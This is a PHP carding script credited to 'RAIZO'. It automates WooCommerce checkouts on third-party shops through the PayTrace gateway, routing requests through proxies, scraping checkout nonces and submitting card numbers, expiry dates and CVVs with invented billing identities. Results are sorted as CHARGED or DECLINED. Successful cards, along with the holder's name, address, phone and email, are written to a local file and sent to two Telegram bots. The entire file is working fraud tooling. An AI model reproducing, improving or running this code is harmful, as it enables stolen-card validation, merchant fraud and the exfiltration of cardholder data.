<?php

# ------------- [ CODE BY RAIZO ]

error_reporting(0);
date_default_timezone_set('Asia/Manila');

include 'include/function.php';
include 'include/useragent.php';

ob_start();
include 'include/atc.php';

$urlComponents = parse_url($final_url);
$site2 = $urlComponents['host'];

include 'include/address.php';

# -------------------- [ ATC ] --------------- #
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $final_url);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'User-Agent: '.$ua,
   'X-Requested-With: XMLHttpRequest',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");
$ATC = curl_exec($ch);
curl_close($ch);

if ($ATC) {
    $checkoutPattern = '/<a href="([^"]+)" class="button (checkout|btn-checkout) wc-forward">Checkout<\/a>|<a href="([^"]+)">Checkout<\/a>|<form[^>]+action="([^"]+)"[^>]*>/';

    if (preg_match($checkoutPattern, $response, $checkoutMatch)) {

        $checkout1 = $checkoutMatch[1] ?: $checkoutMatch[3] ?: $checkoutMatch[4];
         $checkout1;
    } else {
        $checkout1 = "https://$hostname/checkout";
    }
}

# -------------------- [ CHKOUT  ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $checkout1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'User-Agent: '.$ua,
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");

$Checkout = curl_exec($ch);
curl_close($ch);
$nonce = trim(strip_tags(getStr($Checkout,'<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','" />')));
$patterns = '/<tr class="order-total">.*?<th>Total<\/th>\s*<td>\s*<strong>\s*<span class="woocommerce-Price-amount amount">\s*<bdi>\s*<span class="woocommerce-Price-currencySymbol">(.+?)<\/span>\s*([\d.]+)/s';
if (preg_match($patterns, $Checkout, $matches)) {
    $currency_symbol = $matches[1];
    $amount = $matches[2];
    if ($currency_symbol == '&pound;') {
        $currency_symbol = '£';
    }
}    
  $price1 = $currency_symbol . $amount;
    
$validationNonce = preg_match('/"address_validation_nonce":\s*"([^"]+)"/', $Checkout, $matches) ? $matches[1] : null;

#------------- [ VALIDATION ] ---------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://$hostname/wp-admin/admin-ajax.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'user-agent: '.$ua,
    'x-requested-with: XMLHttpRequest',
]);

curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'action' => 'wc_avatax_validate_customer_address',
    'nonce' => $validationNonce,
    'type' => 'billing',
    'address_1' => $street,
    'address_2' => $street,
    'city' => $city,
    'state' => $state,
    'country' => $country,
    'postcode' => $zip,
]));

$validate = curl_exec($ch);
curl_close($ch);
# --------------- [ retries ] ----------- #

$retries = 0;

goers:

# ---------------- [ WC AJAX ] --------- #

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://$hostname/?wc-ajax=checkout");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'User-Agent: '.$ua,
    'X-Requested-With: XMLHttpRequest',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'billing_first_name' => $fname,
    'billing_last_name' => $lname,
    'billing_company' => 'POTANGINAMO',
    'billing_customer_type' => 'personal',
    'billing_vat_number_uid' => 'DE392324340',
    'billing_country' => $country,
    'billing_address_1' => $street,
    'billing_address_2' => '',
    'billing_city' => $city,
    'billing_state' => $state,
    'billing_postcode' => $zip,
    'billing_phone' => $phone,
    'billing_email' => $email,
    'account_username' => $full_name.''.$phone,
    'account_password' => $full_name.''.$phone,
    'payment_method' => 'paytrace',
    'paytrace_type_choice' => 'card',
    'wc-paytrace-payment-check-token' => 'new',
    'paytrace-echeck-routing-number' => '',
    'paytrace-echeck-account-number' => '',
    'wc-paytrace-payment-card-token' => 'new',
    'paytrace-card-number' => $cc,
    'paytrace-card-expiry' => $mes . ' / ' . $ano,
    'paytrace-card-cvc' => $cvv,
    'terms' => 'on',
    'terms-field' => '1',
    'woocommerce-process-checkout-nonce' => $nonce,
    '_wp_http_referer' => '/?wc-ajax=update_order_review'
]));

$Payment = curl_exec($ch);
curl_close($ch);

if (empty($Payment)) {
     "Payment data is empty!";
} else {
    $PaymentDecoded = html_entity_decode($Payment, ENT_QUOTES, 'UTF-8');
    $PaymentDecoded = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', '', $PaymentDecoded);
    $decodedPayment = json_decode($PaymentDecoded, true);
    if (json_last_error() === JSON_ERROR_NONE) {
        if (isset($decodedPayment['messages'])) {
            $Respo = strip_tags($decodedPayment['messages']);
            $Respo = preg_replace('/\s+/', ' ', $Respo);
            $Respo = trim($Respo);
            $Respo = htmlentities($Respo, ENT_QUOTES, 'UTF-8');
             "Message: " . $Respo . "<br>";
        } else {
             "The 'messages' field is missing in the payment data.<br>";
        }
        if (isset($decodedPayment['redirect'])) {
            $receipt = $decodedPayment['redirect'];
            $receipt = htmlentities($receipt, ENT_QUOTES, 'UTF-8');
             "Redirect URL: " . $receipt;
        } else {
             "The 'redirect' field is missing in the payment data.";
        }
    } else {
         "Error decoding JSON: " . json_last_error_msg();
    }
}
$linky = trim(strip_tags(getstr($Payment, '"redirect":"','",')));
$orderid = trim(strip_tags(getstr($Payment, '"order_id":','}')));
$decodedResponse = json_decode($Payment, true);

if (isset($decodedResponse['redirect'])) {
    $receipt = $decodedResponse['redirect'];
}
 $receiptUrl = urldecode($receipt);

# ------------ [ UNLINK COOKIE ] ---------- #

unlink("".$curttt1."/COOKIE/".$inst['cookie']."");
ob_flush();

include 'include/tgforwarder.php';

#----------------- [ RESPONSE ]
if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    echo '
        <div style="font-size: 14px;">
            ' . $badge_cvv . ' ' . $lista . ' [ CHARGED ] [AMOUNT: '.$price1.'] [' . $ip . ']  <a href="' . $hostname1 . '" target="_blank">SITE</a> <a href="' . $receiptUrl . '" target="_blank">RECEIPT</a> <br>
        </div>
    ';
$log_entry = "*GATEWAY : PAYTRACE V1*\n";
$log_entry .= "*CVV* : `" . $escaped_lista . "`\n";
$log_entry .= "*Hostname* : `" . $escaped_hostname . "`\n";
$log_entry .= "*Name* : `" . $escaped_fname . "`\n";
$log_entry .= "*Lastname* : `" . $escaped_lname . "`\n";
$log_entry .= "*Street* : `" . $escaped_street . "`\n";
$log_entry .= "*City* : `" . $escaped_city . "`\n";
$log_entry .= "*State* : `" . $escaped_state . "`\n";
$log_entry .= "*Zip* : `" . $escaped_zip . "`\n";
$log_entry .= "*Country* : `" . $escaped_country . "`\n";
$log_entry .= "*Phone* : `" . $escaped_phone . "`\n";
$log_entry .= "*Email* : `" . $escaped_email . "`\n";

file_put_contents('cvvpaytrace.txt', $log_entry, FILE_APPEND | LOCK_EX);
sendToTelegram($additional_bot_token, $additional_chat_id, $log_entry);
sendToTelegram($default_bot_token, $default_chat_id, $log_entry);
} elseif (strpos($Payment, "We were unable to process your order, please try again.") !== false) {
    echo '
        <div style="font-size: 14px;">
            ' . $badge_declined . ' ' . $lista . ' [ NONCE ERROR ] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';
} elseif (strpos($Payment, '{"result":"failure","messages":"","refresh":false,"reload":true}') !== false) {
    echo '
        <div style="font-size: 14px;">
            ' . $badge_declined . ' ' . $lista . ' [ DECLINED ] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';
} elseif (strpos($Respo, 'Sorry, your session has expired. Return to shop') !== false) {
    echo '
        <div style="font-size: 14px;">
            ' . $badge_declined . ' ' . $lista . ' [ DECLINED ] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';
} else {
    echo '
        <div style="font-size: 14px;">
            ' . $badge_declined . ' ' . $lista . ' [' . $Respo . '] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';
}
?>